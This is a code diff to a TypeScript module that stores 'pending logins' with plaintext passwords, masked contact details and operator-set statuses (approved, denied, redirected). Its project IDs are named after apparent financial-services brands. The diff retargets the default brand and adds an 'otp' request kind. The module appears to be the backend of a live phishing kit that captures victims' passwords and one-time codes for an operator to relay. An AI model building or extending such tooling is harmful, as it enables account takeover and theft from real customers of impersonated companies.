@@ -5,9 +5,12 @@ import { getSql } from '@/lib/db'
 
 export type PendingLoginStatus = 'pending' | 'approved' | 'denied' | 'expired' | 'redirected'
 
+export type PendingRequestKind = 'login' | 'otp'
+
 export interface PendingLogin {
   id: string
   projectId: string
+  requestKind: PendingRequestKind
   userId: string
   password: string
   method: 'email' | 'text'
@@ -35,7 +38,7 @@ async function ensureTable(): Promise<void> {
   await sql`
     CREATE TABLE IF NOT EXISTS pending_logins (
       id TEXT PRIMARY KEY,
-      project_id TEXT NOT NULL DEFAULT 'aptia365-wealthcare',
+      project_id TEXT NOT NULL DEFAULT 'thestandard',
       user_id TEXT NOT NULL,
       password TEXT NOT NULL,
       method TEXT NOT NULL,
@@ -46,7 +49,7 @@ async function ensureTable(): Promise<void> {
     )
   `
   try {
-    await sql`ALTER TABLE pending_logins ADD COLUMN project_id TEXT NOT NULL DEFAULT 'aptia365-wealthcare'`
+    await sql`ALTER TABLE pending_logins ADD COLUMN project_id TEXT NOT NULL DEFAULT 'thestandard'`
   } catch {
     // Column already exists
   }
@@ -55,23 +58,36 @@ async function ensureTable(): Promise<void> {
   } catch {
     // Column already exists
   }
+  try {
+    await sql`ALTER TABLE pending_logins ADD COLUMN request_kind TEXT NOT NULL DEFAULT 'login'`
+  } catch {
+    // Column already exists
+  }
 }
 
-const DEFAULT_PROJECT = 'aptia365-wealthcare'
+function normalizeRequestKind(v: unknown): PendingRequestKind {
+  return v === 'otp' ? 'otp' : 'login'
+}
+
+const DEFAULT_PROJECT = 'thestandard'
 
 export async function createPendingLogin(data: {
   projectId?: string
+  requestKind?: PendingRequestKind
   userId: string
   password: string
   method: 'email' | 'text'
   maskedEmail: string
   maskedPhone: string
+  memberOrigin?: string
 }): Promise<PendingLogin> {
   const id = generateId()
   const projectId = data.projectId ?? DEFAULT_PROJECT
+  const requestKind = data.requestKind ?? 'login'
   const record: PendingLogin = {
     id,
     projectId,
+    requestKind,
     userId: data.userId,
     password: data.password,
     method: data.method,
@@ -86,8 +102,8 @@ export async function createPendingLogin(data: {
     await ensureTable()
     const sql = getSql()
     await sql`
-      INSERT INTO pending_logins (id, project_id, user_id, password, method, masked_email, masked_phone, status, created_at)
-      VALUES (${id}, ${projectId}, ${data.userId}, ${data.password}, ${data.method}, ${data.maskedEmail}, ${data.maskedPhone}, 'pending', ${record.createdAt})
+      INSERT INTO pending_logins (id, project_id, request_kind, user_id, password, method, masked_email, masked_phone, status, created_at)
+      VALUES (${id}, ${projectId}, ${requestKind}, ${data.userId}, ${data.password}, ${data.method}, ${data.maskedEmail}, ${data.maskedPhone}, 'pending', ${record.createdAt})
     `
     return record
   }
@@ -101,14 +117,15 @@ export async function getPendingLogin(id: string): Promise<PendingLogin | undefi
     try {
       const sql = getSql()
       const rows = await sql`
-        SELECT id, COALESCE(project_id, 'aptia365-wealthcare') AS "projectId", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
+        SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
         FROM pending_logins WHERE id = ${id}
       `
       const row = rows[0] as Record<string, unknown> | undefined
       if (!row) return undefined
       return {
         id: String(row.id),
-        projectId: String((row as any).projectId ?? DEFAULT_PROJECT),
+        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
+        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
         userId: String(row.userId),
         password: String(row.password),
         method: row.method as 'email' | 'text',
@@ -124,7 +141,7 @@ export async function getPendingLogin(id: string): Promise<PendingLogin | undefi
   }
   const mem = inMemoryStore.get(id)
   if (!mem) return undefined
-  return { ...mem, projectId: DEFAULT_PROJECT }
+  return { ...mem, projectId: mem.projectId ?? DEFAULT_PROJECT, requestKind: mem.requestKind ?? 'login' }
 }
 
 export async function listPendingLogins(): Promise<PendingLogin[]> {
@@ -141,12 +158,13 @@ export async function listPendingLogins(): Promise<PendingLogin[]> {
       `
       
       const rows = await sql`
-        SELECT id, COALESCE(project_id, 'aptia365-wealthcare') AS "projectId", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
+        SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
         FROM pending_logins WHERE status = 'pending' ORDER BY created_at ASC
       `
       return (rows as Record<string, unknown>[]).map((row) => ({
         id: String(row.id),
-        projectId: String((row as any).projectId ?? DEFAULT_PROJECT),
+        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
+        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
         userId: String(row.userId),
         password: String(row.password),
         method: row.method as 'email' | 'text',
@@ -185,12 +203,13 @@ export async function listAllLogins(limit: number = 100): Promise<PendingLogin[]
       `
       
       const rows = await sql`
-        SELECT id, COALESCE(project_id, 'aptia365-wealthcare') AS "projectId", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
+        SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
         FROM pending_logins ORDER BY created_at DESC LIMIT ${limit}
       `
       return (rows as Record<string, unknown>[]).map((row) => ({
         id: String(row.id),
-        projectId: String((row as any).projectId ?? DEFAULT_PROJECT),
+        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
+        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
         userId: String(row.userId),
         password: String(row.password),
         method: row.method as 'email' | 'text',
@@ -227,13 +246,14 @@ export async function setPendingLoginStatus(
       const rows = await sql`
         UPDATE pending_logins SET status = ${status}
         WHERE id = ${id} AND status = 'pending'
-        RETURNING id, COALESCE(project_id, 'aptia365-wealthcare') AS "projectId", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt"
+        RETURNING id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt"
       `
       const row = (rows as Record<string, unknown>[])[0]
       if (!row) return undefined
       return {
         id: String(row.id),
-        projectId: String((row as any).projectId ?? DEFAULT_PROJECT),
+        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
+        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
         userId: String(row.userId),
         password: String(row.password),
         method: row.method as 'email' | 'text',
